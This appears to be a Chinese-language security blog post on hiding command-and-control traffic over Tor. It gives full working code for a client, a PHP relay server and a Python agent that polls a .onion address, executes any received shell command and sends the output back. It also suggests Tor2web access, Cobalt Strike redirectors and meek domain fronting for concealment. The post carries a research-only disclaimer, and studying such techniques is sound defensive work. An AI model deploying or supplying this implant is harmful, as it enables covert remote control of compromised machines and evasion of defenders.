# 利用Tor进行C2隐藏的一些探索

## 0x01 概述

近期研究了一下基于Tor网络的一些通信技巧，该文是对相关思路的一个记录，包括建立Hidden service、C2通信Demo和一些衍生用法的思考。

Tor，即洋葱路由（The onion router），俗称暗网，相关细节可从维基百科了解。[Tor (Wikipedia)](https://zh.wikipedia.org/wiki/Tor)

**以下任何内容仅供安全研究、学习，严禁用于任何非授权的攻击行为。**

## 0x02 建立Tor hidden service

以Debian 10为例，安装Tor

```bash
apt update
apt install tor
```

安装nginx，安装php备用

```bash
apt install nginx nginx-extras # 安装nginx-extras以备不时之需
apt install php php-fpm
```

修改Tor配置文件

```bash
vim /etc/tor/torrc
# 在配置文件中取消下列三行的注释
# 下面是我的配置例子
HiddenServiceDir /var/lib/tor/hidden_service/
HiddenServicePort 80 127.0.0.1:8080
HiddenServiceVersion 3
```

修改nginx配置文件，为Tor监听8080端口，注意，监听127.0.0.1就行了，不然四舍五入等于白给。下面是我的配置。

```bash
mkdir /var/www/tor && chown www-data:www-data /var/www/tor
cd /etc/nginx/sites-enabled
touch tor
vim tor
```

```nginx
server {
        listen 127.0.0.1:8080;
        root /var/www/tor;
        location / {
            try_files $uri $uri/ =404;
        }
				# 顺便把PHP配上
        location ~ \.php$ {
            fastcgi_pass   unix:/run/php/php7.3-fpm.sock;
            fastcgi_index  index.php;
            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
            include        fastcgi_params;
        }
}
```

启动服务

```bash
systemctl start tor
systemctl start php7.3-fpm
systemctl start nginx
```

如果一切正常，那么/var/lib/tor/hidden_service/hostname内就会出现你的hostname了，如果该文件或目录不存在，检查Tor服务启动情况，是否报错。在Tor browser中应当可以通过该XXXX.onion的url访问/var/www/tor中的资源。

## 0x03 经由Tor网络进行C2通信

我们首先从头开始设计一个走Tor网络通信的demo。在这个demo中，角色分为三个，client(控制端)、server(服务端)、agent(被控制端)。

一个简单的思路是，client可以把任务上传到server，并可以从server或取该任务的执行结果；agent从server获取任务，将任务执行，之后将执行结果返回到server。

为了简单明了，这里就不搞什么队列、生产者消费者这些乱七八糟的了，我们直接用PHP和Python糊一个简单的demo。

client代码：

```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-
"""
File:   :   client.py
Time    :   2021/08/17 09:32:13
Author  :   Hack3rHan
Contact :   i@010.moe
"""
import base64
import requests


class Client(object):
    # Tor browser proxy
    proxy = {
        'http': 'socks5h://127.0.0.1:9150',
        'https': 'socks5h://127.0.0.1:9150'
    }
    url = 'http://examplexxxxxxxxx.onion/server.php'

    # Tor2web
    tor2web_url = 'http://examplexxxxxxxxx.onion.ws/server.php'


    def put_task(self, cmd:str) -> None:
        data = {
            'identity': 'client',
            'action': 'put',
            'data': base64.b64encode(cmd.encode('utf-8')).decode('utf-8')
        }
        try:
            resp = requests.post(url=self.url, proxies=self.proxy, data=data, timeout=30)
        except Exception:
            print("[!] ERROR: Can not connect to TOR.")
            return
        print(resp.text)

    def get_res(self) -> None:
        data = {
            'identity': 'client',
            'action': 'get',
        }
        try:
            resp = requests.post(url=self.url, proxies=self.proxy, data=data, timeout=30)
        except Exception:
            print("[!] ERROR: Can not connect to TOR.")
            return
        try:
            print(base64.b64decode(resp.text).decode('utf-8'))
        except Exception:
            print(f"[*] INFO: Server return {resp.text}")

    def run(self):
        while True:
            act = input('->')
            if act == 'get':
                self.get_res()
            elif act == 'put':
                cmd = input('cmd: ')
                self.put_task(cmd)
            else:
                break


if __name__ == '__main__':
    client = Client()
    client.run()
```

agent 代码：

```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-
"""
File:   :   tor_demo.py
Time    :   2021/08/16 16:45:01
Author  :   Hack3rHan
Contact :   i@010.moe
"""
import base64
import os
import requests

from time import sleep


class Agent(object):
    # Tor browser proxy
    proxy = {
        'http': 'socks5h://127.0.0.1:9150',
        'https': 'socks5h://127.0.0.1:9150'
    }
    url = 'http://examplexxxxxxxxx.onion/server.php'

    # Tor2web
    tor2web_url = 'http://examplexxxxxxxxx.onion.ws/server.php'


    def get_task(self) -> str or None:
        data = {
            'identity': 'agent',
            'action': 'get'
        }
        try:
            resp = requests.post(url=self.url, proxies=self.proxy, data=data, timeout=30)
        except Exception:
            print("[!] ERROR: Can not connect to TOR.")
            return
        return resp.text

    @staticmethod
    def exec_cmd(cmd: str) -> str:
        exec_res = os.popen(cmd)
        return exec_res.read()

    def put_exec_res(self, exec_res: str) -> None:
        data = {
            'identity': 'agent',
            'action': 'put',
            'data': exec_res
        }
        try:
            resp = requests.post(url=self.url, proxies=self.proxy, data=data, timeout=30)
        except Exception:
            print("[!] ERROR: Can not connect to TOR.")
            return

    def run(self):
        while True:
            sleep(30)
            task = self.get_task()
            if task and task != 'FAILED':
                try:
                    exec_res = self.exec_cmd(base64.b64decode(task).decode('utf-8'))
                except Exception:
                    continue

                self.put_exec_res(base64.b64encode(exec_res.encode('utf-8')).decode('utf-8'))
            else:
                print(f"[!] WARNING: Server return {task}")
        

if __name__ == '__main__':
    agent = Agent()
    agent.run()

```

server 代码:

```php
<?php
    error_reporting(E_ERROR);
    
    $identity = $_POST["identity"];
    $action = $_POST["action"];
    $data = $_POST["data"];

    $task_file_path = "/tmp/tor_c2/task";
    $exec_res_file_path = "/tmp/tor_c2/exec_res";
    $base_dir = "/tmp/tor_c2/";

    if(!is_dir($base_dir)){
        mkdir($base_dir, 0777, true);
    }

    if ($identity === "client"){
        if ($action === "put" and isset($data)){
            file_put_contents($task_file_path, $data);
            echo "SUCCESS";
        }
        elseif ($action === "get"){
            if ($exec_res = file_get_contents($exec_res_file_path)){
                echo $exec_res;
            }
            else{
                echo "FAILED";
            }
        }
    }

    if ($identity === "agent"){
        if ($action === "put" and isset($data)){
            file_put_contents($exec_res_file_path, $data);
        }
        elseif ($action === "get"){
            if ($task = file_get_contents($task_file_path)){
                echo $task;
            }
            else{
                echo "FAILED";
            }
        }
    }
?>
```

测试一下：

![](..\img\2021-8-23-1.PNG)



## 0x04 基于Tor2Web服务的改进

上面提到的Demo看着好像还正常，但是这里有一个很大的问题：Python接入Tor网络的方式。这里我们演示上是使用的本地的Tor Browser的socks5 Proxy接入了Tor，那真正的agent总不能绑一个浏览器吧？我查找了一些用Python直接连Tor网络的库，并没有找到很好的解决方案，但在寻找过程中，我发现了一种名叫tor2web的服务，在使用时可以把xxxxxxx.onion改为xxxxxxx.onion.to等形式直接访问，相当于将暗网内容转发到了正常web服务上，目前发现.onion.ws可用。因此，上面的demo可用直接使用tor2web服务进行。

不过既然能用web服务了，为什么还需要这么一个丑陋的demo呢，我们完全可以将上面的nginx配置为Cobalt Strike的redirector，实现CS上线了，多年前就有大佬实现了这一点，这里就不再演示。

[大佬博客：Tor Fronting](https://evi1cg.me/archives/Tor_Fronting.html)

## 0x05 利用Tor进行域前置

Tor为了方便人们在某些Tor被封锁的地区使用了，内置了一个网桥的功能，其中的meek网桥就是采用了域前置技术。meek网桥历史上有过meek-awv，meek-google和meek-auzre三种，随着Google和Amazon封堵了域前置，目前只有meek-azure可用。Fireeye的某份报告中披露了某组织使用meek网桥进行域前置技术，进一步了解可以搜一下这篇报告。

